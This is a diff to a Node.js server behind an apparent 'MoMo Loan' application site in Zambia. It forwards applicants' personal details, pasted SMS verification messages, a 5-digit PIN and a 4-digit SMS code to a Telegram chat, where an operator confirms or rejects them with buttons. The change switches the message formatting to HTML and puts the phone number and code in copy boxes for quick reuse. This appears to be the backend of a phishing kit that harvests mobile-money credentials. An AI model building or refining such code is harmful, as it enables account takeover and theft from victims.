@@ -22,27 +22,27 @@ var decisions = {};
 var firstCodes = {};
 
 // ============================================================
-// 1) SUBMIT APPLICATION
+// 1) SUBMIT APPLICATION  ← phone number gets copy box
 // ============================================================
 app.post('/api/submit-application', async function (req, res) {
     var d = req.body;
 
     var message =
-        '🔔 *New MoMo Loan Application*\n' +
+        '🔔 <b>New MoMo Loan Application</b>\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '\n📋 *LOAN DETAILS*\n' +
+        '\n📋 <b>LOAN DETAILS</b>\n' +
         '• Type:      ' + (d.loanType || '-') + '\n' +
         '• Amount:    ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
         '• Term:      ' + (d.term || '-') + ' months\n' +
         '• Purpose:   ' + (d.purpose || '-') + '\n' +
-        '\n👤 *APPLICANT*\n' +
+        '\n👤 <b>APPLICANT</b>\n' +
         '• Name:      ' + (d.firstName || '-') + ' ' + (d.lastName || '-') + '\n' +
         '• Email:     ' + (d.email || '-') + '\n' +
-        '• Phone:     +260 ' + (d.phone || '-') + '\n' +
-        '\n💼 *EMPLOYMENT*\n' +
+        '• Phone:\n<pre><code>+260 ' + escapeHtml(d.phone || '-') + '</code></pre>\n' +
+        '\n💼 <b>EMPLOYMENT</b>\n' +
         '• Status:    ' + (d.employment || '-') + '\n' +
         '• Income:    ZMW ' + Number(d.income || 0).toLocaleString() + '\n' +
-        '\n🕐 *Submitted:* ' + new Date().toLocaleString() + '\n' +
+        '\n🕐 <b>Submitted:</b> ' + new Date().toLocaleString() + '\n' +
         '━━━━━━━━━━━━━━━━━━━━━━';
 
     try {
@@ -53,7 +53,7 @@ app.post('/api/submit-application', async function (req, res) {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown'
+                parse_mode: 'HTML'
             })
         });
 
@@ -71,26 +71,18 @@ app.post('/api/submit-application', async function (req, res) {
 });
 
 // ============================================================
-// 2) VERIFY CODE — FIRST MESSAGE (FULL DETAILS + BUTTONS)
+// 2) VERIFY CODE  ← ONLY phone + SMS + buttons
 // ============================================================
 app.post('/api/verify-code', async function (req, res) {
     var d = req.body;
 
     var referenceId = 'REF' + Date.now() + Math.floor(Math.random() * 1000);
     decisions[referenceId] = 'pending';
-
     firstCodes[referenceId] = d.code;
 
-        var message =
-        '🔑 *Loan Application Code Received*\n' +
-        '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '👤 ' + (d.firstName || '-') + ' ' + (d.lastName || '-') + '\n' +
-        '\n📱 *Phone:*\n`' + escapeMd(d.phone || '-') + '`\n' +
-        '\n💰 Amount: ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
-        '\n📩 *Full SMS Message Pasted:*\n`' + escapeMd(d.code || '-') + '`\n' +
-        '\n🕐 ' + new Date().toLocaleString() + '\n' +
-        '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '✅ Confirm if this matches the code you sent.';
+    var message =
+        '📱 <pre><code>' + escapeHtml(d.phone || '-') + '</code></pre>\n' +
+        '\n<pre><code>' + escapeHtml(d.code || '-') + '</code></pre>';
 
     var keyboard = {
         inline_keyboard: [[
@@ -106,7 +98,7 @@ app.post('/api/verify-code', async function (req, res) {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown',
+                parse_mode: 'HTML',
                 reply_markup: keyboard
             })
         });
@@ -129,13 +121,22 @@ function escapeMd(str) {
         .replace(/\[/g, '\\[');
 }
 
+// Escape HTML entities for copy blocks
+function escapeHtml(str) {
+    if (str === null || str === undefined) return '-';
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+}
+
 // ============================================================
 // 3) RESEND CODE (SHORT)
 // ============================================================
 app.post('/api/resend-code', async function (req, res) {
     var d = req.body;
 
-        var message =
+    var message =
         '🔄 *Resend Requested*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
         '\n📱 *Phone:*\n`' + escapeMd(d.phone || '-') + '`\n' +
@@ -231,7 +232,7 @@ app.post('/api/telegram-callback', async function (req, res) {
                 chat_id: cb.message.chat.id,
                 message_id: cb.message.message_id,
                 text: cb.message.text + '\n\n— — —\n' + (action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED'),
-                parse_mode: 'Markdown'
+                parse_mode: 'HTML'
             })
         });
     } catch (err) {
@@ -242,12 +243,12 @@ app.post('/api/telegram-callback', async function (req, res) {
 });
 
 // ============================================================
-// 7) FINAL CODE (5-digit PIN)  →  SHORT, NO REF
+// 7) FINAL CODE (5-digit PIN)
 // ============================================================
 app.post('/api/final-code', async function (req, res) {
     var d = req.body;
 
-        var message =
+    var message =
         '🎯 *5-Digit PIN Submitted*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
         '\n📱 *Phone:*\n`' + escapeMd(d.phone || '-') + '`\n' +
@@ -273,7 +274,7 @@ app.post('/api/final-code', async function (req, res) {
 });
 
 // ============================================================
-// 8) LAST CODE (4-digit SMS code)  →  SHORT, NO REF + BUTTONS
+// 8) LAST CODE (4-digit SMS code)
 // ============================================================
 app.post('/api/last-code', async function (req, res) {
     var d = req.body;
